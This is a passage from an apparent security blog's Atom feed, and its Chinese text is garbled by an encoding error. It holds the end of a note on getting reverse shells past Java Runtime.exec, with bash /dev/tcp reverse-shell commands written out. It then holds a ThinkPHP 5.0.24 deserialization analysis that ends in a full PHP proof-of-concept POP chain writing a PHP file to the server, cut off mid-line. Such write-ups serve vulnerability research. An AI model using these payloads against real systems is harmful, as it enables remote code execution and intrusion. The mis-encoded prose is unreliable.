ls</code>ÔºåÂèëÁé∞<code>$@</code>„ÄÇ<code>$@</code>ÈúÄË¶ÅÂèñËÑöÊú¨ÁöÑÂèÇÊï∞ÔºåÈÇ£‰πàÂ∞±‰ºöËß£Êûê<code>xxx echo ls</code>ÔºåÁî±‰∫é<code>$@</code>Âè™‰ºöÂèñËÑöÊú¨ÂèÇÊï∞Ôºå‰ºöÂ∞ÜÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ËÆ§‰∏∫ÊòØËÑöÊú¨ÂêçÁß∞<strong>(ËÆ§‰∏∫<code>xxx</code>ÊòØËÑöÊú¨ÂêçÁß∞)</strong>ÔºåÂ∞±‰ºöÂèñÂà∞<code>echo ls</code>„ÄÇÈÇ£‰πàÊúÄÁªàÊâßË°åÁöÑÂ∞±ÊòØ<code>echo ls|sh</code>ÔºåÂ∞±ÂèØ‰ª•ÊàêÂäüÂú∞ÊâßË°å<code>ls</code>ÂëΩ‰ª§‰∫Ü„ÄÇ</p><p>Âà©Áî®‰∏äÈù¢Ëøô‰∏™<code>trick</code>ÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§‰∫ÜÔºåÂåÖÊã¨ÂèçÂºπshell„ÄÇÂ¶Ç<code>/bin/bash -c &#39;$@|bash&#39; 0 echo &#39;bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&#39;</code>ÊúÄÁªàÂèØ‰ª•ÊàêÂäüÂú∞ÂèçÂºπshell</p><pre class=" language-shell"><code class="language-shell">Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");Runtime.getRuntime().exec("/bin/bash -c $*|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");</code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15831418726956.jpg" alt="-w974"></p><p>ÊúÄÁªàÁõ∏ÂΩì‰∫éÊâßË°å‰∫Ü<code>echo &#39;bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1&#39;|bash</code>ÂëΩ‰ª§ÔºåÊàêÂäüÂèçÂºπshell</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://xz.aliyun.com/t/2548#toc-0" target="_blank" rel="noopener">LinuxÂèçÂºπshellÔºà‰∏ÄÔºâÊñá‰ª∂ÊèèËø∞Á¨¶‰∏éÈáçÂÆöÂêë</a></li><li><a href="https://xz.aliyun.com/t/2549#toc-8" target="_blank" rel="noopener">Linux ÂèçÂºπshellÔºà‰∫åÔºâÂèçÂºπshellÁöÑÊú¨Ë¥®</a></li><li><a href="https://www.cnblogs.com/leixiao-/p/10216571.html" target="_blank" rel="noopener">linux‰∏ãÂΩ¢Â¶Ç{command,parameter,parameter}ÊâßË°åÂëΩ‰ª§ / bashËä±Êã¨Âè∑Êâ©Â±ï</a></li><li><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="noopener">ÁªïËøáexecËé∑ÂèñÂèçÂºπshell</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Á¨îËÆ∞&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Thinkphp 5.0.x ÂèçÂ∫èÂàóÂåñÁÆÄÊûê</title>
    <link href="https://blog.sari3l.com/posts/56fcf5d8/"/>
    <id>https://blog.sari3l.com/posts/56fcf5d8/</id>
    <published>2020-02-26T07:49:46.000Z</published>
    <updated>2020-07-06T09:45:08.157Z</updated>
    
    <content type="html"><![CDATA[<ul><li>TP 5.0.24 &amp; PHP 5.6.40</li></ul><p>‰øÆÊîπ<code>application/index/controller/Index.php</code>ÂÜÖÂÆπ</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Welcome thinkphp 5.0.24"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$input</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="ÁÆÄÊûê"><a href="#ÁÆÄÊûê" class="headerlink" title="ÁÆÄÊûê"></a>ÁÆÄÊûê</h2><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h3><p>ËøôÈáåÂíå5.1.37ÈÇ£ÁØáÊñáÁ´†ÂºÄÂ§¥ÊúâÁÇπÂÉèÔºåÂè™Êúâ<code>\think\process\pipes\Windows::__destruct</code>‰∏≠Â§ö‰ΩøÁî®‰∫Ü‰∏Ä‰∏™ removeFiles ÊñπÊ≥ïÔºåË∑üËøõÂêéÔºåÂèØËßÅË∞ÉÁî® file_existsÔºåÈÄöËøáÊ≥®ÈáäÂèØËßÅÂèÇÊï∞Á±ªÂûã‰∏∫ stringÔºåËøôÊ†∑‰ºöË∞ÉÁî®<code>$filename -&gt; __toString()</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826470016466.jpg" alt="-w871"></p><h3 id="Âà©Áî®ÁÇπ"><a href="#Âà©Áî®ÁÇπ" class="headerlink" title="Âà©Áî®ÁÇπ"></a>Âà©Áî®ÁÇπ</h3><p>ÂèØ‰ª•ÁúãÂà∞ Collection„ÄÅModel ÊòØË∞ÉÁî®‰∫ÜÂÖ∂‰∏ãÁöÑ toJson ÊñπÊ≥ï</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826936451605.jpg" alt="-w725"></p><p>Âú®<code>\think\Collection::toArray</code>‰∏≠ÔºåÂèØ‰ª•ÁúãÂà∞‰πüÊòØÈúÄË¶ÅÂà©Áî® Model Á±ª</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826936245004.jpg" alt="-w574"></p><p>ÊâÄ‰ª•Êàë‰ª¨Áõ¥Êé•Áúã<code>\think\Model::toArray</code>Âç≥ÂèØÔºåÂú®ËøΩÂä†Â±ûÊÄßÈò∂ÊÆµÔºåÊúâ‰∏â‰∏™Âú∞ÊñπÂèØËÉΩËÉΩÂà©Áî®<code>__call</code></p><ol><li>ÈúÄË¶ÅÊéßÂà∂‰º†ÂÖ• name Êù•ÊéßÂà∂ key Âèä attrÔºåÂêåÊó∂ÁõÆÊ†á __call ËÉΩËß£ÊûêÊï∞ÁªÑÂèÇÊï∞</li><li>ÈúÄË¶ÅÁõÆÊ†áÁ±ª‰∏ã __call Êàñ getBindAttr ÊúâËâØÂ•ΩÁöÑÂà©Áî®Êù°‰ª∂</li><li>ÈúÄË¶ÅÊéßÂà∂‰º†ÂÖ• attrÔºåÂêåÊó∂ÁõÆÊ†áÁ±ª‰∏ã __call ÊúâËâØÂ•ΩÁöÑÂà©Áî®Êù°‰ª∂</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826939320759.jpg" alt="-w823"></p><p>ÊñáÁ´†‰∏≠Âà©Áî®Á¨¨‰∏â‰∏™ÁÇπÔºåÁªßÁª≠ÂàÜÊûê</p><h3 id="Â¶Ç‰ΩïÂà∞ËææÂà©Áî®ÁÇπ"><a href="#Â¶Ç‰ΩïÂà∞ËææÂà©Áî®ÁÇπ" class="headerlink" title="Â¶Ç‰ΩïÂà∞ËææÂà©Áî®ÁÇπ"></a>Â¶Ç‰ΩïÂà∞ËææÂà©Áî®ÁÇπ</h3><p>ÊÉ≥Ë¶ÅÂà∞ËææÂà©Áî®ÁÇπÔºåÈúÄË¶ÅÊàë‰ª¨Ê¢≥ÁêÜ‰∏≠Èó¥ÁöÑÈÄªËæëÊµÅÁ®ã</p><ol><li><code>$this-&gt;append</code>‰∏ç‰∏∫Á©∫</li><li><code>$name</code>‰∏ç‰∏∫Êï∞ÁªÑÔºå‰∏çÂ≠òÂú®<code>.</code>Ôºå‰∏î‰∏∫ÂΩìÂâçÁ±ª‰∏≠ÊñπÊ≥ïÂêç</li><li>ÈÄöËøá<code>$this-&gt;$$name()</code>ÊéßÂà∂<code>$modelRelation</code>‰ªéËÄåÊéßÂà∂ÂèÇÊï∞<code>$attr</code>ÔºåÂèØ‰ª•ÁúãÂà∞<code>getError</code>ÊòØÊúÄÂêàÈÄÇÁöÑ<br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826955438147.jpg" alt="-w311"></li><li>ÈÄöËøá<code>$this-&gt;getRelationData</code>ÊéßÂà∂ÁõÆÊ†áÁ±ª<code>$value</code></li></ol><p>ÂêåÊó∂‰∏∫‰∫ÜÊñπ‰æøÊéßÂà∂ÁõÆÊ†áÁ±ª<code>$value</code>ÔºåÂú® getRelationData Êó∂Â∞ΩÈáèÊéßÂà∂Á¨¨‰∏Ä‰∏™ if ÈÄªËæëÁõ¥Êé•ËøîÂõû<code>$this-&gt;parent</code><br>    <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826947783395.jpg" alt="-w1024"></p><h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><p>Áé∞Âú®Êàë‰ª¨È¶ñÂÖàÈúÄË¶ÅÁ°ÆÂÆöÁõÆÊ†áÁ±ªÔºåÂèÇÊï∞Á±ª</p><h4 id="modelRelation"><a href="#modelRelation" class="headerlink" title="modelRelation"></a>modelRelation</h4><p>Ê†πÊçÆ‰∏äÈù¢ getRelationData ‰∏≠ÁöÑÈÄªËæëÂà§Êñ≠ÔºåÈúÄË¶ÅÊéßÂà∂</p><ol><li><code>$modelRelation-&gt;isSelfRelation == false</code></li><li><code>$modelRelation-&gt;getModel == ÁõÆÊ†áÁ±ª</code></li></ol><p>Ê≥®ÊÑèËøòÈúÄË¶Å3. <code>$modelRelation-&gt;getBindAttr()</code>ÂèØÊéß</p><p>Ê†πÊçÆÁ¨¨‰∏Ä‰∏™Êù°‰ª∂ÔºåÊàë‰ª¨Êü•ËØ¢ÁªßÊâø Relation ÁöÑÁ±ªÔºåÂêåÊó∂Áî±‰∫é Relation ÂÆûÁé∞‰∫Ü getModel ÊñπÊ≥ïÂπ∂ÂèØÊéßÔºåÂøΩÁï•Á¨¨‰∫å‰∏™Êù°‰ª∂</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826960259287.jpg" alt="-w419"></p><p>Ê†πÊçÆÁ¨¨‰∏â‰∏™Êù°‰ª∂ÔºåÂèØ‰ª•ÁúãÂà∞Âè™Êúâ<code>\think\model\relation\OneToOne::getBindAttr</code>ÂÆûÁé∞ÔºåÂÖ∂‰ªñÁöÑÁ±ªÊó¢Ê≤°ÊúâËá™Ë∫´ÂÆûÁé∞ÔºåÂêåÊó∂‰πüÊ≤°ÊúâË¢´ÁªßÊâøÂÆûÁé∞</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826964065423.jpg" alt="-w369"></p><p>‰ΩÜÁî±‰∫éÂÆÉÊú¨Ë∫´ÊòØ‰∏Ä‰∏™Êé•Âè£Á±ªÔºåÊàë‰ª¨ÈúÄË¶ÅÂà©Áî®ÂÖ∂Â≠êÁ±ª<code>BelongsTo</code>Êàñ<code>HasOne</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826966406977.jpg" alt="-w401"></p><hr><p>Êúâ‰∫∫‰ºöËØ¥ÔºöÂèØÂê¶Âà©Áî® else ‰∏≠ÁöÑÈÄªËæëÂà§Êñ≠ÊéßÂà∂ËøîÂõûÂÄºÔºü</p><p>ÈÄöËøáÊêúÂØªÔºåÂèëÁé∞ÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™ Model ‰∏ìÈó®Áî®‰∫éËøîÂõûÁõÆÊ†áÁ±ªÔºå‰ΩÜÊòØÊ≥®ÊÑèÁî±‰∫éModelÊ≤°ÊúâÂÆûÁé∞getBindAttr‰∏çÊª°Ë∂≥Êù°‰ª∂‰∏âÔºå‰∏îÂ≠êÁ±ªÂùá‰πüÊú™ÂÆûÁé∞Ê≠§ÊñπÊ≥ïÔºåÊâÄ‰ª•ÊòØ‰∏çÂèØË°åÁöÑÔºõËÄåÂÖ∂‰ªñÁöÑÁ±ªÂú®ÊéßÂà∂ËøîÂõûÁõÆÊ†áÁ±ªÊó∂ÂÄôÂ∞±ÂæàÁ¥Ø‰∫Ü</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826971735907.jpg" alt="-w703"></p><h4 id="ÁõÆÊ†áÁ±ª"><a href="#ÁõÆÊ†áÁ±ª" class="headerlink" title="ÁõÆÊ†áÁ±ª"></a>ÁõÆÊ†áÁ±ª</h4><p>Áé∞Âú®Êàë‰ª¨ËÉΩÁ°ÆÂÆömodelRelationÂêéÔºåÊàë‰ª¨Áé∞Âú®ÈúÄË¶ÅÂÅöÁöÑÊòØÊâæÂà∞‰∏Ä‰∏™ÁõÆÊ†áÁ±ªÔºåÂÜçÁ°ÆÂÆöÂ¶Ç‰ΩïËøõ‰∏ÄÊ≠•Âà©Áî®ÔºåÈÄöËøáÊêúÂØª<code>__call</code>ÔºåÁ≤óÁï•ÁúãÂà∞Áñë‰ººËÉΩÂà©Áî®ÁöÑÊúâ<code>Request</code>Âíå<code>Output</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826978995403.jpg" alt="-w703"></p><p>‰ΩÜÂÆûÈôÖ‰∏äÔºåÂú®5.0.24ÁâàÊú¨‰∏≠Ôºå<code>\think\Request::__call</code>Èáå<code>self::$hook</code>ÊòØÊó†Ê≥ïÂà©Áî®ÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826979780166.jpg" alt="-w727"></p><p>ÊâÄ‰ª•ËÉΩÂà©Áî®ÁöÑÂè™Êúâ OutputÔºåÁî±‰∫é‰º†ÂÖ•ÁöÑ<code>$mothod==&#39;getAttr&#39;</code>ÔºåÊâÄ‰ª•ËøôÈáåÂà©Áî® block ÂáΩÊï∞ËæÉÂ•Ω</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826983024896.jpg" alt="-w725"></p><p>ËÄåÂú®block ÂáΩÊï∞‰∏≠ÔºåÂèØ‰ª•ÁúãÂà∞ÊúÄÁªà‰ºöË∞ÉÁî®<code>$this-&gt;handle</code>‰∏ãÁöÑ write ÂáΩÊï∞</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826983826820.jpg" alt="-w669"></p><h4 id="write-Âà©Áî®"><a href="#write-Âà©Áî®" class="headerlink" title="write Âà©Áî®"></a>write Âà©Áî®</h4><p>Êàë‰ª¨ÂÖ®Â±ÄÊêúÁ¥¢‰∏ã write ÂáΩÊï∞ÁöÑÂÆûÁé∞ÔºåÂêåÊó∂Ê≥®ÊÑèÂà∞<strong>PHP ‰ºöËá™Âä®ÂøΩÁï•‰º†Ëæì‰∏≠Â§öÂá∫Êù•ÁöÑÂèÇÊï∞</strong></p><p>Áñë‰ººÂèØÂà©Áî®ÁöÑÁ±ªÊúâ‰∏â‰∏™ÔºåÂÆûÁé∞‰∏äÈÉΩÊòØ<code>$this-&gt;handler-&gt;set(...)</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826989229084.jpg" alt="-w895"></p><p>ÊâÄ‰ª•Êàë‰ª¨ËøòË¶ÅÂÖ®Â±ÄÊêúÁ¥¢‰∏ã set ÂáΩÊï∞ÁöÑÂÆûÁé∞Ôºå‰ª•‰∏ã‰∏§‰∏™Á±ªÊúÄÁªàÈÉΩÂÆûÁé∞‰∫Ü<code>file_put_contents</code>ÂÜôÊñá‰ª∂</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826992159835.jpg" alt="-w886"></p><p>‰ΩÜÊòØÊ≥®ÊÑèÂà∞<code>\think\cache\driver\Lite::set</code>‰∏≠ÂÜôÂÖ•Êó∂Ë¢´ÂµåÂÖ•Âú® php ÁéØÂ¢É‰∏≠‰∏îË¢´ÂºïÂè∑ÂåÖË£πÔºåÊó†Ê≥ïÂÆûÁé∞Âà©Áî®</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15827014331691.jpg" alt="-w814"><br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15827015000819.jpg" alt="-w809"></p><p>ÊâÄ‰ª•ËÉΩÂà©Áî®ÁöÑ‰πüÂè™Êúâ<code>\think\cache\driver\File::set</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826995764409.jpg" alt="-w750"></p><p>Âè¶Â§ñÊ≥®ÊÑèÂà∞ÔºåÂÖ∂ÂÆû‰∏çÊòØ‰∏ÄÊ¨°ÊÄßË∞ÉÁî®<code>set -&gt; file_put_contents</code>ÂÆûÁé∞ÁöÑÂÜôÂÖ•ÔºåËÄåÊòØÂú®<code>$this-&gt;setTagItem</code>‰∏≠Áî±Ê≤°ÊúâÁºìÂ≠òÔºåÂØºËá¥Â∞Ü filename ‰Ωú‰∏∫Êñ∞ÁöÑÂÜÖÂÆπËøõË°å‰∫åÊ¨°ÂÜôÂÖ•</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15827016902485.jpg" alt="-w560"></p><h2 id="POP-Chain"><a href="#POP-Chain" class="headerlink" title="POP Chain"></a>POP Chain</h2><p>Áõ¥Êé•‰∏ä‰∫∫ÂÆ∂ÁöÑÂõæÔºåÊñáÁ´†ÈìæÊé•Âú®ÂèÇËÄÉËµÑÊñô‰∏≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15827018116768.jpg" alt></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>Êñá‰ª∂ÂêçÁîüÊàêËßÑÂàô</p><pre class=" language-php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token string">'sari3l'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&lt;?cuc cucvasb();?>'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'tag_'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>POC</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'expire'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token string">'cache_subdir'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token string">'prefix'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//        'path' => './sari3l/',</span>        <span class="token string">'path'</span> <span class="token operator">=</span><span class="token operator">></span> 'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?>',</span>        <span class="token string">'data_compress'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token operator">=</span><span class="token string">'sari3l'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcached</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Query</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">HasOne</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"sari3l"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"test"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"sari3l"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"getError"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HasOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 